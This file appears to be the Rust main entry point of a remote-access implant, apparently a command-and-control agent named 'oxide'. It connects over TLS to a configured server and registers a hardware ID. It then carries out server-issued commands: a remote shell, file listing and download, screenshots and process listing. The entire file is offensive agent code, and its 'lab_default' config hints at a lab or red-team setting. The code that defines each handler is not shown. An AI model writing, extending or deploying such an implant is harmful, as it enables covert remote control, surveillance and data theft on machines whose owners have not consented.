mod config;
mod transport;
mod checkin;
mod platform;
mod dispatcher;
mod commands;

use commands::{shell, file_list, file_download, screenshot, process_list};
use oxide_shared::packet::Packet;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let config = config::Config::lab_default();

    let mut dispatch = dispatcher::Dispatcher::new();
    dispatch.register("shell", Box::new(shell::ShellHandler));
    dispatch.register("file_list", Box::new(file_list::FileListHandler));
    dispatch.register("file_download", Box::new(file_download::FileDownloadHandler));
    dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
    dispatch.register("process_list", Box::new(process_list::ProcessListHandler));

    println!("[*] Connecting to {}:{}...", config.host, config.port);
    let mut transport = transport::Transport::connect(&config).await?;
    println!("[+] TLS handshake complete");

    let checkin_pkt = checkin::build_checkin_packet();
    println!("[*] HWID: {}", checkin_pkt.data["hwid"]);
    transport.send(checkin_pkt).await?;

    let ack = transport.receive().await?;
    let session_id = ack.data["session_id"].as_str().unwrap_or("?");
    println!("[+] Registered, session: {session_id}");

    loop {
        match transport.receive().await {
            Ok(packet) => {
                match packet.packet_type.as_str() {
                    "command" => {
                        let response = dispatch.dispatch(&packet);
                        transport.send(response).await?;
                    }
                    "heartbeat" => {
                        let hb = Packet::new("heartbeat", serde_json::json!({}));
                        transport.send(hb).await?;
                    }
                    other => {
                        eprintln!("[!] Unknown packet type: {other}");
                    }
                }
            }
            Err(e) => {
                eprintln!("[!] Receive error: {e}");
                break;
            }
        }
    }
    Ok(())
}
